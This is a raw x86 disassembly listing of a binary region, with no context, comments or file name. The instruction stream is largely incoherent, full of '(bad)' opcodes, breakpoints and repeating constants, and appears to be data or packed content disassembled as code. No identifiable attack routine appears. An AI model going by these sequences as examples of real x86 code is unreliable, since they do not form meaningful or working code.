  409e43:	add    esp,DWORD PTR [edx+0x62bd41bd]
  409e49:	bound  esi,QWORD PTR [edi+0x40]
  409e4c:	xor    al,0x24
  409e4e:	popa   
  409e4f:	dec    ebx
  409e50:	and    ebp,edx
  409e52:	daa    
  409e53:	or     DWORD PTR [ecx],esi
  409e55:	pop    esi
  409e56:	sub    BYTE PTR [edx+0x20],bh
  409e59:	les    esi,FWORD PTR [edi+0x40]
  409e5c:	loope  0x409e05
  409e5e:	dec    edi
  409e5f:	sub    ah,BYTE PTR [edx-0x21]
  409e62:	pop    es
  409e63:	push   ss
  409e64:	js     0x409e21
  409e66:	clc    
  409e67:	int    0x62
  409e69:	inc    eax
  409e6a:	and    eax,0x5406600
  409e6f:	inc    ebx
  409e70:	inc    ecx
  409e71:	inc    eax
  409e72:	inc    eax
  409e73:	inc    ebx
  409e74:	add    BYTE PTR [eax],al
  409e76:	add    BYTE PTR [edx-0x34],ah
  409e79:	inc    eax
  409e7a:	add    eax,0x40004041
  409e7f:	inc    ecx
  409e80:	int3   
  409e81:	add    BYTE PTR [ebx-0x7c],al
  409e84:	add    eax,0x5406240
  409e89:	bound  esi,QWORD PTR [edx+ecx*8]
  409e8c:	ja     0x409eee
  409e8e:	loop   0x409e28
  409e90:	sbb    BYTE PTR ds:0x4059dc80,ch
  409e96:	es sub ebx,ecx
  409e99:	and    ebp,eax
  409e9b:	pop    es
  409e9c:	ja     0x409eb0
  409e9e:	dec    ebp
  409e9f:	mov    al,ds:0x6948b8a8
  409ea4:	inc    eax
  409ea5:	bound  ebx,QWORD PTR [eax+0x41]
  409ea8:	add    eax,0x40404340
  409ead:	inc    ebx
  409eae:	inc    eax
  409eaf:	test   BYTE PTR [eax],al
  409eb1:	add    eax,0x40624041
  409eb6:	inc    eax
  409eb7:	add    BYTE PTR [edx+0x5],ah
  409eba:	inc    ebx
  409ebb:	add    BYTE PTR [eax+0x78],al
  409ebe:	inc    ecx
  409ebf:	add    BYTE PTR [eax+0x41],bl
  409ec2:	bound  edx,QWORD PTR [ecx+0x40]
  409ec5:	bound  ecx,QWORD PTR [ebx+0x62cb0d11]
  409ecb:	ja     0x409ed2
  409ecd:	sub    BYTE PTR [esi],cl
  409ecf:	inc    esp
  409ed0:	leave  
  409ed1:	push   esp
  409ed2:	inc    esp
  409ed3:	dec    eax
  409ed4:	inc    eax
  409ed5:	push   esi
  409ed6:	into   
  409ed7:	inc    edx
  409ed8:	es inc esp
  409eda:	cmp    al,0x76
  409edc:	adc    eax,DWORD PTR [ecx-0x3e76a6e8]
  409ee2:	fdivr  st(6),st
  409ee4:	inc    eax
  409ee5:	cmc    
  409ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ee7:	aam    0x73
  409ee9:	ins    DWORD PTR es:[edi],dx
  409eea:	add    eax,0x9676576
  409eef:	inc    eax
  409ef0:	test   BYTE PTR [eax],al
  409ef2:	int3   
  409ef3:	bound  eax,QWORD PTR ds:0xcc840f41
  409ef9:	inc    ebx
  409efa:	add    BYTE PTR [eax+0x0],al
  409efd:	inc    eax
  409efe:	inc    eax
  409eff:	inc    eax
  409f00:	int3   
  409f01:	add    BYTE PTR ds:0x62404341,al
  409f07:	pop    eax
  409f08:	add    BYTE PTR [ebx+0x40],al
  409f0b:	bound  ecx,QWORD PTR [edi]
  409f0d:	inc    eax
  409f0e:	xor    eax,0x2a87a8b6
  409f13:	inc    eax
  409f14:	sub    BYTE PTR [ebp+0x6a12446a],0x76
  409f1b:	ds jp  0x409f3c
  409f1e:	cmp    eax,0x1a37bc46
  409f23:	add    DWORD PTR [edi-0x36],ecx
  409f26:	bound  esi,QWORD PTR [ecx+eax*2+0x1176d4]
  409f2d:	shr    BYTE PTR [ebx-0x4c],1
  409f30:	ins    DWORD PTR es:[edi],dx
  409f31:	add    eax,0x34ba807f
  409f36:	jl     0x409f4d
  409f38:	xor    al,0x7b
  409f3a:	jne    0x409f61
  409f3c:	inc    eax
  409f3d:	pop    ss
  409f3e:	arpl   WORD PTR [ecx+0x63],ax
  409f41:	dec    eax
  409f42:	mov    edx,0x8d9b3149
  409f47:	loop   0x409f49
  409f49:	add    BYTE PTR [eax+0x40],al
  409f4c:	cmovno eax,DWORD PTR ds:0x40056243
  409f53:	int3   
  409f54:	add    ah,cl
  409f56:	inc    eax
  409f57:	inc    eax
  409f58:	bound  eax,QWORD PTR [ecx+0x0]
  409f5b:	add    BYTE PTR [edi],cl
  409f5d:	inc    ebx
  409f5e:	inc    eax
  409f5f:	inc    eax
  409f60:	add    BYTE PTR [ecx+0x43],al
  409f63:	add    eax,0x40256240
  409f68:	bound  eax,QWORD PTR [eax]
  409f6a:	xchg   esp,eax
  409f6b:	add    eax,0x6a400175
  409f70:	fdivr  st,st(2)
  409f72:	or     eax,0x2151b2cb
  409f77:	stos   BYTE PTR es:[edi],al
  409f78:	inc    esp
  409f79:	mov    dl,0xcd
  409f7b:	xchg   edx,eax
  409f7c:	jne    0x409f7f
  409f7e:	loopne 0x409ff3
  409f80:	and    al,0xd
  409f82:	outs   dx,DWORD PTR ds:[esi]
  409f83:	mov    edi,0xe7a42ac
  409f88:	push   0x41
  409f8a:	xor    al,0x4a
  409f8c:	jne    0x409f8e
  409f8e:	bswap  ecx
  409f90:	arpl   bx,ax
  409f92:	inc    ecx
  409f93:	aad    0x9a
  409f95:	outs   dx,BYTE PTR ds:[esi]
  409f96:	inc    ebx
  409f97:	or     edi,DWORD PTR [eax+0x2f]
  409f9a:	xchg   esp,eax
  409f9b:	mov    ah,0x75
  409f9d:	sub    al,0x1
  409f9f:	add    eax,0x4140cc00
  409fa4:	inc    eax
  409fa5:	inc    ebx
  409fa6:	bound  esp,QWORD PTR ds:0x41400043
  409fac:	add    BYTE PTR [eax],al
  409fae:	add    eax,0x43624062
  409fb3:	inc    ecx
  409fb4:	inc    eax
  409fb5:	inc    eax
  409fb6:	inc    eax
  409fb7:	add    eax,0x40624340
  409fbc:	add    eax,0x40664140
  409fc1:	inc    eax
  409fc2:	fs stc 
  409fc4:	cmp    eax,0x4e00cc62
  409fc9:	inc    eax
  409fca:	mov    ah,0xb0
  409fcc:	ret    
  409fcd:	jl     0x40a044
  409fcf:	popf   
  409fd0:	add    BYTE PTR [eax+0x15],0x5
  409fd4:	jne    0x40a04e
  409fd6:	push   cs
  409fd7:	jle    0x40a00f
  409fd9:	inc    esi
  409fda:	retf   
  409fdb:	inc    ecx
  409fdc:	xor    al,0x62
  409fde:	jne    0x409fa9
  409fe0:	inc    edx
  409fe1:	les    edx,FWORD PTR [edx]
  409fe3:	inc    ecx
  409fe4:	dec    eax
  409fe5:	(bad)  
  409fe6:	outs   dx,DWORD PTR ds:[esi]
  409fe7:	test   DWORD PTR [ecx],eax
  409fe9:	adc    bl,BYTE PTR [edi+0x757bc5c0]
  409fef:	rol    DWORD PTR [esi],0x40
  409ff2:	inc    edi
  409ff3:	xor    dh,BYTE PTR [eax]
  409ff5:	test   al,0x43
  409ff7:	mov    es,WORD PTR [ebx+0x0]
  409ffa:	add    eax,0x41107840
  409fff:	bound  eax,QWORD PTR [eax+0x40]
  40a002:	sldt   WORD PTR [eax-0x34]
  40a006:	js     0x40a06a
  40a008:	add    eax,0x40664143
  40a00d:	inc    ebx
  40a00e:	add    BYTE PTR [ecx+0x5],al
  40a011:	js     0x40a053
  40a013:	bound  eax,QWORD PTR [eax+0x0]
  40a016:	inc    eax
  40a017:	adc    DWORD PTR ds:0x40d2f894,0x74
  40a01e:	sub    BYTE PTR [esi+0x40],ch
  40a021:	shr    DWORD PTR [esi+0x3ca50104],0x9
  40a028:	(bad)  
  40a029:	rcl    BYTE PTR ds:0x83749d52,1
  40a02f:	js     0x40a078
  40a031:	fadd   QWORD PTR [ecx+0x44]
  40a034:	clc    
  40a035:	fist   WORD PTR [ebx*4-0x3bbe9da0]
  40a03c:	sub    BYTE PTR [edx+ecx*1-0x51],dh
  40a040:	inc    eax
  40a041:	inc    eax
  40a042:	rol    BYTE PTR [ecx+0x43],0x40
  40a046:	inc    eax
  40a047:	add    eax,0x434162
  40a04c:	inc    eax
  40a04d:	add    BYTE PTR [edx+0x5],ah
  40a050:	inc    eax
  40a051:	adc    BYTE PTR [edx+0x40],ah
  40a054:	inc    ebx
  40a055:	inc    ecx
  40a056:	add    eax,0x4340
  40a05b:	add    eax,0x404162
  40a060:	add    BYTE PTR [eax+0x43],al
  40a063:	inc    eax
  40a064:	add    eax,0x7a06450e
  40a069:	dec    eax
  40a06a:	push   ecx
  40a06b:	add    al,0x2d
  40a06d:	test   al,0xb9
  40a06f:	je     0x40a085
  40a071:	cmp    DWORD PTR [ecx],0xd812fa67
  40a077:	ja     0x40a056
  40a079:	dec    esi
  40a07a:	or     al,0x32
  40a07c:	lods   al,BYTE PTR ds:[esi]
  40a07d:	lods   al,BYTE PTR ds:[esi]
  40a07e:	bound  esi,QWORD PTR [ebp+ebp*1+0x2]
  40a082:	inc    eax
  40a083:	test   al,0x40
  40a085:	add    BYTE PTR [eax],al
  40a087:	inc    ecx
  40a088:	inc    ebx
  40a089:	add    eax,0x41784062
  40a08e:	inc    eax
  40a08f:	inc    eax
  40a090:	add    BYTE PTR [edi],cl
  40a092:	bound  eax,QWORD PTR [ebx+0x0]
  40a095:	add    eax,0x25006240
  40a09a:	inc    eax
  40a09b:	add    eax,0x40254143
  40a0a0:	add    eax,0xd620000
  40a0a5:	push   edi
  40a0a6:	aam    0x6e
  40a0a8:	pop    ebp
  40a0a9:	das    
  40a0aa:	or     eax,0x5624143
  40a0af:	je     0x40a072
  40a0b1:	pop    es
  40a0b2:	inc    eax
  40a0b3:	sub    al,BYTE PTR [ecx-0x6c]
  40a0b6:	xchg   DWORD PTR [ebp+0x66],esp
  40a0b9:	add    al,0x14
  40a0bb:	inc    ecx
  40a0bc:	ror    BYTE PTR ds:0xa1c4742b,0x40
  40a0c3:	or     BYTE PTR ds:0x21542764,ah
  40a0c9:	dec    BYTE PTR [eax]
  40a0cb:	and    cl,bh
  40a0cd:	cmp    dl,al
  40a0cf:	jae    0x40a0e6
  40a0d1:	add    DWORD PTR [edx+eiz*2-0x56],eax
  40a0d5:	rol    DWORD PTR ds:0x4069c2b9,cl
  40a0db:	pop    ebx
  40a0dc:	inc    ebx
  40a0dd:	add    BYTE PTR [eax],al
  40a0df:	add    BYTE PTR [ecx+0x40],al
  40a0e2:	bound  esp,QWORD PTR [esi+0x0]
  40a0e5:	inc    eax
  40a0e6:	add    eax,0x5400000
  40a0eb:	inc    ecx
  40a0ec:	inc    eax
  40a0ed:	inc    eax
  40a0ee:	bound  esp,QWORD PTR ds:0x25050043
  40a0f4:	inc    ecx
  40a0f5:	inc    ebx
  40a0f6:	inc    eax
  40a0f7:	test   BYTE PTR [eax+0x0],al
  40a0fa:	bound  ebx,QWORD PTR [eax+0x62]
  40a0fd:	inc    ecx
  40a0fe:	inc    eax
  40a0ff:	add    eax,0x2e7387c4
  40a104:	cmp    esp,0xcc4f4140
  40a10a:	test   al,0x49
  40a10c:	inc    ecx
  40a10d:	inc    edi
  40a10e:	add    eax,0x730d0242
  40a113:	rol    DWORD PTR [eax-0x43b98a0],0xc9
  40a11a:	nop
  40a11b:	and    dl,BYTE PTR [edi+0x6210c425]
  40a121:	inc    eax
  40a122:	inc    ecx
  40a123:	and    eax,0x40000500
  40a128:	inc    ebx
  40a129:	add    eax,0x40624041
  40a12e:	inc    ebx
  40a12f:	add    eax,0x43402541
  40a134:	bound  eax,QWORD PTR [eax+0x43]
  40a137:	int3   
  40a138:	inc    eax
  40a139:	bound  eax,QWORD PTR [eax]
  40a13b:	inc    ecx
  40a13c:	inc    eax
  40a13d:	inc    eax
  40a13e:	add    eax,0x8c623405
  40a143:	jno    0x40a108
  40a145:	das    
  40a146:	mov    BYTE PTR [eax-0x45f27108],ch
  40a14c:	mov    WORD PTR [ebp+0x62],ds
  40a14f:	inc    edx
  40a150:	test   al,0x54
  40a152:	int    0x40
  40a154:	rol    DWORD PTR ds:0x62152a40,0xc8
  40a15b:	inc    eax
  40a15c:	xchg   edi,eax
  40a15d:	push   ebp
  40a15e:	sbb    BYTE PTR [ecx+0x41],al
  40a161:	lock add eax,0x40013040
  40a167:	addr16 inc edx
  40a169:	(bad)  
  40a16a:	leave  
  40a16b:	and    cl,al
  40a16d:	ja     0x40a183
  40a16f:	bound  eax,QWORD PTR [eax+0x25]
  40a172:	add    BYTE PTR [esi+0x40],ah
  40a175:	add    eax,0x40404143
  40a17a:	inc    ebx
  40a17b:	add    BYTE PTR [eax],al
  40a17d:	add    BYTE PTR [edx-0x34],ah
  40a180:	inc    eax
  40a181:	add    eax,0x40004041
  40a186:	inc    ecx
  40a187:	int3   
  40a188:	add    BYTE PTR [ebx-0x7c],al
  40a18b:	add    eax,0x5406240
  40a190:	(bad)  
  40a191:	cld    
  40a192:	in     al,0x62
  40a194:	clc    
  40a195:	inc    eax
  40a196:	loopne 0x40a11a
  40a198:	inc    eax
  40a199:	(bad)  
  40a19a:	cli    
  40a19b:	dec    esp
  40a19c:	add    eax,0x6e10c241
  40a1a1:	ins    DWORD PTR es:[edi],dx
  40a1a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1a3:	inc    esp
  40a1a4:	int    0x40
  40a1a6:	xor    dl,BYTE PTR [eax]
  40a1a8:	inc    eax
  40a1a9:	retf   0xd90d
  40a1ac:	les    eax,FWORD PTR [eax+0x4f]
  40a1af:	push   ds
  40a1b0:	push   cs
  40a1b1:	lea    eax,[ecx+0x30]
  40a1b4:	adc    eax,0x406ec57f
  40a1b9:	(bad)  
  40a1bb:	test   al,0xc9
  40a1bd:	pop    esp
  40a1be:	and    eax,DWORD PTR [eax+0xf]
  40a1c1:	aas    
  40a1c2:	cmp    DWORD PTR [edi],ebp
  40a1c4:	inc    eax
  40a1c5:	bound  ebx,QWORD PTR [eax+0x41]
  40a1c8:	add    eax,0x40404340
  40a1cd:	inc    ebx
  40a1ce:	inc    eax
  40a1cf:	test   BYTE PTR [eax],al
  40a1d1:	add    eax,0x40624041
  40a1d6:	inc    eax
  40a1d7:	add    BYTE PTR [edx+0x5],ah
  40a1da:	inc    ebx
  40a1db:	add    BYTE PTR [eax+0x78],al
  40a1de:	inc    ecx
  40a1df:	add    BYTE PTR [eax+0x41],bl
  40a1e2:	bound  esi,QWORD PTR [eax+0x4034c37f]
  40a1e8:	je     0x40a1e3
  40a1ea:	ficom  WORD PTR ds:0x92c554c
  40a1f0:	arpl   WORD PTR [edx+eiz*2-0x7f3f8233],sp
  40a1f7:	inc    eax
  40a1f8:	(bad)  
  40a1f9:	or     BYTE PTR [edi+0x223a6c0],bl
  40a1ff:	adc    al,0xa8
  40a201:	fcmovnb st,st(0)
  40a203:	or     eax,0x40175d7d
  40a208:	inc    ecx
  40a209:	inc    eax
  40a20a:	inc    edx
  40a20b:	leave  
  40a20c:	xchg   cl,al
  40a20e:	call   0x4073cc16
  40a213:	mov    al,ds:0x40019d7d
  40a218:	adc    al,BYTE PTR [eax-0x7c]
  40a21b:	add    ah,cl
  40a21d:	bound  eax,QWORD PTR ds:0xcc840f41
  40a223:	inc    ebx
  40a224:	add    BYTE PTR [eax+0x0],al
  40a227:	inc    eax
  40a228:	inc    eax
  40a229:	inc    eax
  40a22a:	int3   
  40a22b:	add    BYTE PTR ds:0x62404341,al
  40a231:	pop    eax
  40a232:	add    BYTE PTR [ebx+0x40],al
  40a235:	bound  ecx,QWORD PTR [edi]
  40a237:	inc    eax
  40a238:	clc    
  40a239:	addr16 or eax,0x154555da
  40a23f:	inc    edx
  40a240:	ds sub ch,cl
  40a243:	jge    0x40a207
  40a245:	add    BYTE PTR [eax+0x4],0x41
  40a249:	inc    eax
  40a24a:	mov    edi,0x123934c8
  40a24f:	nop
  40a250:	or     eax,0x597dbf40
  40a255:	inc    edx
  40a256:	inc    eax
  40a257:	(bad)  
  40a258:	in     al,0x40
  40a25a:	mov    edi,0x1480c027
  40a25f:	add    DWORD PTR [ecx-0x75],ecx
  40a262:	cmp    al,0x7d
  40a264:	and    eax,DWORD PTR [ebx]
  40a266:	inc    eax
  40a267:	leave  
  40a268:	cld    
  40a269:	(bad)  
  40a26a:	lds    ebx,FWORD PTR [esi]
  40a26c:	jns    0x40a288
  40a26e:	adc    eax,DWORD PTR [eax]
  40a270:	add    BYTE PTR [eax+0x40],al
  40a273:	cmovno eax,DWORD PTR ds:0x40056243
  40a27a:	int3   
  40a27b:	add    ah,cl
  40a27d:	inc    eax
  40a27e:	inc    eax
  40a27f:	bound  eax,QWORD PTR [ecx+0x0]
  40a282:	add    BYTE PTR [edi],cl
  40a284:	inc    ebx
  40a285:	inc    eax
  40a286:	inc    eax
  40a287:	add    BYTE PTR [ecx+0x43],al
  40a28a:	add    eax,0x40256240
  40a28f:	bound  eax,QWORD PTR [eax]
  40a291:	dec    eax
  40a292:	imul   ecx,DWORD PTR [edi-0x37],0x4046c17d
  40a299:	or     eax,0x13e0475c
  40a29e:	pop    esi
  40a29f:	add    DWORD PTR [esi],ecx
  40a2a1:	retf   
  40a2a2:	jns    0x40a231
  40a2a4:	add    eax,0x40ffc174
  40a2a9:	inc    edx
  40a2aa:	fst    st(4)
  40a2ac:	int    0x41
  40a2ae:	inc    esp
  40a2af:	add    DWORD PTR ds:0x4140cc00,eax
  40a2b5:	inc    eax
  40a2b6:	inc    ebx
  40a2b7:	bound  esp,QWORD PTR ds:0x41400043
  40a2bd:	add    BYTE PTR [eax],al
  40a2bf:	add    eax,0x43624062
  40a2c4:	inc    ecx
  40a2c5:	inc    eax
  40a2c6:	inc    eax
  40a2c7:	inc    eax
  40a2c8:	add    eax,0x40624340
  40a2cd:	add    eax,0x40664140
  40a2d2:	or     DWORD PTR [esi+0x47],ecx
  40a2d5:	aas    
  40a2d6:	inc    eax
  40a2d7:	jae    0x40a29a
  40a2d9:	aad    0x40
  40a2db:	int3   
  40a2dc:	or     al,0xd8
  40a2de:	pushf  
  40a2df:	or     dl,BYTE PTR [edx-0x7f]
  40a2e2:	pop    ds
  40a2e3:	fisubr WORD PTR [edx+eiz*2+0x5]
  40a2e7:	jae    0x40a2ac
  40a2e9:	bound  eax,QWORD PTR [eax-0x6]
  40a2ec:	pushf  
  40a2ed:	rol    BYTE PTR [esi+0x1406ef04],cl
  40a2f3:	test   al,0x5
  40a2f5:	dec    eax
  40a2f6:	sub    eax,0x402c7273
  40a2fb:	adc    cl,bl
  40a2fd:	push   edx
  40a2fe:	fwait
  40a2ff:	imul   eax,ecx,0x2e
  40a302:	adc    BYTE PTR [esp+edi*2-0x40],dl
  40a306:	add    eax,0x5004373
  40a30b:	inc    eax
  40a30c:	js     0x40a31e
  40a30e:	inc    ecx
  40a30f:	bound  eax,QWORD PTR [eax+0x40]
  40a312:	sldt   WORD PTR [eax-0x34]
  40a316:	js     0x40a37a
  40a318:	add    eax,0x40664143
  40a31d:	inc    ebx
  40a31e:	add    BYTE PTR [ecx+0x5],al
  40a321:	js     0x40a363
  40a323:	bound  eax,QWORD PTR [eax+0x0]
  40a326:	inc    eax
  40a327:	push   0x27114081
  40a32c:	dec    ebx
  40a32d:	xchg   BYTE PTR [ebx-0x3e],bl
  40a330:	inc    edx
  40a331:	sbb    ebx,ecx
  40a333:	pushf  
  40a334:	and    DWORD PTR [edi],ebp
  40a336:	inc    eax
  40a337:	xor    eax,0x7c484081
  40a33c:	xlat   BYTE PTR ds:[ebx]
  40a33d:	call   0x2545:0x12547340
  40a344:	test   al,0x5
  40a346:	inc    eax
  40a347:	ret    0x4080
  40a34a:	inc    esp
  40a34b:	inc    ecx
  40a34c:	inc    ebx
  40a34d:	inc    eax
  40a34e:	inc    eax
  40a34f:	add    eax,0x434162
  40a354:	inc    eax
  40a355:	add    BYTE PTR [edx+0x5],ah
  40a358:	inc    eax
  40a359:	adc    BYTE PTR [edx+0x40],ah
  40a35c:	inc    ebx
  40a35d:	inc    ecx
  40a35e:	add    eax,0x4340
  40a363:	add    eax,0x404162
  40a368:	add    BYTE PTR [eax+0x43],al
  40a36b:	inc    eax
  40a36c:	add    eax,0x648691bc
  40a371:	xor    esi,DWORD PTR [edi-0x35fa6bfd]
  40a377:	and    eax,DWORD PTR [eax+0x67]
  40a37a:	xor    eax,0x4fcb6740
  40a37f:	cdq    
  40a380:	inc    eax
  40a381:	ret    0x575
  40a384:	inc    ebx
  40a385:	push   esp
  40a386:	inc    eax
  40a387:	add    eax,0x408004b0
  40a38c:	sub    BYTE PTR ds:0x407f,dl
  40a392:	inc    ecx
  40a393:	inc    ebx
  40a394:	add    eax,0x41784062
  40a399:	inc    eax
  40a39a:	inc    eax
  40a39b:	add    BYTE PTR [edi],cl
  40a39d:	bound  eax,QWORD PTR [ebx+0x0]
  40a3a0:	add    eax,0x25006240
  40a3a5:	inc    eax
  40a3a6:	add    eax,0x40254143
  40a3ab:	add    eax,0x86620000
  40a3b0:	inc    eax
  40a3b1:	dec    edx
  40a3b2:	and    DWORD PTR [esi+edi*2],eax
  40a3b5:	retf   
  40a3b6:	sub    BYTE PTR [esi+0x7e],ch
  40a3b9:	rcl    BYTE PTR [edx+ebx*2-0x58],0x48
  40a3be:	inc    ecx
  40a3bf:	cwde   
  40a3c0:	xor    eax,0x12400d95
  40a3c5:	xor    al,0x23
  40a3c7:	add    eax,0x36d06e7e
  40a3cc:	push   esp
  40a3cd:	inc    eax
  40a3ce:	clc    
  40a3cf:	xchg   BYTE PTR [eax+edx*8],cl
  40a3d2:	add    BYTE PTR [eax],bl
  40a3d4:	inc    ecx
  40a3d5:	push   esp
  40a3d6:	bound  esi,QWORD PTR [edx]
  40a3d8:	jle    0x40a39c
  40a3da:	je     0x40a41f
  40a3dc:	add    BYTE PTR [eax],al
  40a3de:	add    BYTE PTR [ecx+0x40],al
  40a3e1:	bound  esp,QWORD PTR [esi+0x0]
  40a3e4:	inc    eax
  40a3e5:	add    eax,0x5400000
  40a3ea:	inc    ecx
  40a3eb:	inc    eax
  40a3ec:	inc    eax
  40a3ed:	bound  esp,QWORD PTR ds:0x25050043
  40a3f3:	inc    ecx
  40a3f4:	inc    ebx
  40a3f5:	inc    eax
  40a3f6:	test   BYTE PTR [eax+0x0],al
  40a3f9:	bound  ebx,QWORD PTR [eax+0x62]
  40a3fc:	inc    ecx
  40a3fd:	inc    eax
  40a3fe:	bound  eax,QWORD PTR [edx]
  40a400:	cmp    eax,0x2176975b
  40a405:	cmp    eax,0xbcc3b823
  40a40a:	add    eax,0x3802007e
  40a40f:	fs dec eax
  40a411:	jo     0x40a399
  40a413:	dec    esi
  40a414:	ret    0x626d
  40a417:	inc    esp
  40a418:	leave  
  40a419:	sub    esp,DWORD PTR [ecx]
  40a41b:	jge    0x40a450
  40a41d:	sbb    ch,BYTE PTR [esi]
  40a41f:	add    bh,BYTE PTR [eax+0x88796dc]
  40a425:	sbb    al,0x18
  40a427:	retf   
  40a428:	or     eax,0xc1790540
  40a42d:	and    BYTE PTR [edx+0x48],0xcb
  40a431:	sub    al,0x86
  40a433:	std    
  40a434:	inc    esi
  40a435:	adc    ebx,DWORD PTR [ecx]
  40a437:	inc    ecx
  40a438:	push   eax
  40a439:	adc    BYTE PTR [edx+0x40],ah
  40a43c:	inc    ecx
  40a43d:	and    eax,0x40000500
  40a442:	inc    ebx
  40a443:	add    eax,0x40624041
  40a448:	inc    ebx
  40a449:	add    eax,0x43402541
  40a44e:	bound  eax,QWORD PTR [eax+0x43]
  40a451:	int3   
  40a452:	inc    eax
  40a453:	bound  eax,QWORD PTR [eax]
  40a455:	inc    ecx
  40a456:	inc    eax
  40a457:	inc    eax
  40a458:	add    eax,0x4037d305
  40a45d:	les    eax,FWORD PTR [eax-0x6c]
  40a460:	ror    DWORD PTR [edi+0x2c],cl
  40a463:	xchg   ebp,eax
  40a464:	inc    eax
  40a465:	adc    ah,BYTE PTR cs:[edx-0x44]
  40a469:	daa    
  40a46a:	je     0x40a471
  40a46c:	inc    eax
  40a46d:	push   ss
  40a46e:	inc    eax
  40a46f:	inc    edi
  40a470:	inc    ebx
  40a471:	call   0x65e4d8
  40a476:	inc    ax
  40a478:	add    eax,0x40404143
  40a47d:	inc    ebx
  40a47e:	add    BYTE PTR [eax],al
  40a480:	add    BYTE PTR [edx-0x34],ah
  40a483:	inc    eax
  40a484:	add    eax,0x40004041
  40a489:	inc    ecx
  40a48a:	int3   
  40a48b:	add    BYTE PTR [ebx-0x7c],al
  40a48e:	add    eax,0x5406240
  40a493:	bound  edi,QWORD PTR [esi+eax*4+0x2c605254]
  40a49a:	rol    BYTE PTR [ebp+0x57],0x33
  40a49e:	inc    eax
  40a49f:	rol    BYTE PTR [ecx+0x48],0x19
  40a4a3:	call   0x27813980
  40a4a8:	add    BYTE PTR [eax+ebp*4],ch
  40a4ab:	sbb    BYTE PTR [ecx+0x6240a005],0x58
  40a4b2:	inc    ecx
  40a4b3:	add    eax,0x40404340
  40a4b8:	inc    ebx
  40a4b9:	inc    eax
  40a4ba:	test   BYTE PTR [eax],al
  40a4bc:	add    eax,0x40624041
  40a4c1:	inc    eax
  40a4c2:	add    BYTE PTR [edx+0x5],ah
  40a4c5:	inc    ebx
  40a4c6:	add    BYTE PTR [eax+0x78],al
  40a4c9:	inc    ecx
  40a4ca:	add    BYTE PTR [eax+0x41],bl
  40a4cd:	bound  eax,QWORD PTR [edx+0x32]
  40a4d0:	inc    ecx
  40a4d1:	adc    BYTE PTR [ebx-0xd],dh
  40a4d4:	xchg   BYTE PTR [eax-0x40],al
  40a4d7:	ret    0x543c
  40a4da:	imul   esi,DWORD PTR [ecx+edi*1+0x77],0x2a34430
  40a4e2:	xor    dh,bl
  40a4e4:	xchg   ebx,eax
  40a4e5:	pop    ds
  40a4e6:	inc    esi
  40a4e7:	cmp    ah,0xcb
  40a4ea:	(bad)  
  40a4eb:	mov    eax,0x25c17505
  40a4f0:	bound  ecx,QWORD PTR [eax+0x6f]
  40a4f3:	add    eax,0x6a76e686
  40a4f8:	inc    eax
  40a4f9:	inc    esp
  40a4fa:	xor    al,0x75
  40a4fc:	and    DWORD PTR [ebp-0x3c],esi
  40a4ff:	sub    DWORD PTR [edx+eiz*2],0x84400640
  40a506:	add    ah,cl
  40a508:	bound  eax,QWORD PTR ds:0xcc840f41
  40a50e:	inc    ebx
  40a50f:	add    BYTE PTR [eax+0x0],al
  40a512:	inc    eax
  40a513:	inc    eax
  40a514:	inc    eax
  40a515:	int3   
  40a516:	add    BYTE PTR ds:0x62404341,al
  40a51c:	pop    eax
  40a51d:	add    BYTE PTR [ebx+0x40],al
  40a520:	bound  ecx,QWORD PTR [edi]
  40a522:	inc    eax
  40a523:	xchg   edx,eax
  40a524:	data16 das 
  40a526:	arpl   WORD PTR [ebp-0x24],sp
  40a529:	mov    eax,0x4b740562
  40a52e:	or     DWORD PTR [esp+esi*1+0x4c864641],0x286252c1
  40a539:	aas    
  40a53a:	jbe    0x40a573
  40a53c:	inc    eax
  40a53d:	in     eax,dx
  40a53e:	add    DWORD PTR [esi],eax
  40a540:	xchg   ecx,eax
  40a541:	(bad)
  40a545:	lds    ecx,FWORD PTR [edi+0x8]
  40a548:	push   0x400539a0
  40a54d:	rol    DWORD PTR [ebx],0x52
  40a550:	ror    DWORD PTR [edi-0x30],cl
  40a553:	xchg   BYTE PTR [eax+0x72],dl
  40a556:	add    BYTE PTR [esi-0x30],al
  40a559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a55a:	bound  ebp,QWORD PTR [eax+eax*2]
  40a55d:	ret    
  40a55e:	add    BYTE PTR [eax],al
  40a560:	inc    eax
  40a561:	inc    eax
  40a562:	cmovno eax,DWORD PTR ds:0x40056243
  40a569:	int3   
  40a56a:	add    ah,cl
  40a56c:	inc    eax
  40a56d:	inc    eax
  40a56e:	bound  eax,QWORD PTR [ecx+0x0]
  40a571:	add    BYTE PTR [edi],cl
  40a573:	inc    ebx
  40a574:	inc    eax
  40a575:	inc    eax
  40a576:	add    BYTE PTR [ecx+0x43],al
  40a579:	add    eax,0x40256240
  40a57e:	bound  eax,QWORD PTR [eax]
  40a580:	sub    BYTE PTR [eax+edi*1],0x6a
  40a584:	jl     0x40a516
  40a586:	inc    eax
  40a587:	dec    ebx
  40a588:	sub    DWORD PTR [eax],esi
  40a58a:	dec    esp
  40a58b:	or     DWORD PTR [edi-0x13f6ffb],ebp
  40a591:	jmp    0x3440:0x86258432
  40a598:	aas    
  40a599:	je     0x40a543
  40a59b:	test   al,0xcc
  40a59d:	and    DWORD PTR [ecx+0x19],edi
  40a5a0:	cmp    ebp,0x8fb04110
  40a5a6:	rcl    DWORD PTR gs:[edx-0x9],0x54
  40a5ab:	daa    
  40a5ac:	test   al,0x5
  40a5ae:	je     0x40a5ff
  40a5b0:	or     edx,0x42
  40a5b3:	and    DWORD PTR [ebx],ecx
  40a5b5:	xchg   BYTE PTR [ecx+0x7e8032c3],ah
  40a5bb:	cld    
  40a5bc:	add    eax,0x4140cc00
  40a5c1:	inc    eax
  40a5c2:	inc    ebx
  40a5c3:	bound  esp,QWORD PTR ds:0x41400043
  40a5c9:	add    BYTE PTR [eax],al
  40a5cb:	add    eax,0x43624062
  40a5d0:	inc    ecx
  40a5d1:	inc    eax
  40a5d2:	inc    eax
  40a5d3:	inc    eax
  40a5d4:	add    eax,0x40624340
  40a5d9:	add    eax,0x40664140
  40a5de:	xor    esp,DWORD PTR [ecx]
  40a5e0:	inc    eax
  40a5e1:	add    DWORD PTR ds:[ecx-0x6c],ecx
  40a5e5:	cmp    eax,0xc2408e62
  40a5ea:	inc    ebx
  40a5eb:	jno    0x40a652
  40a5ed:	cmp    al,0x6e
  40a5ef:	add    eax,0xec036040
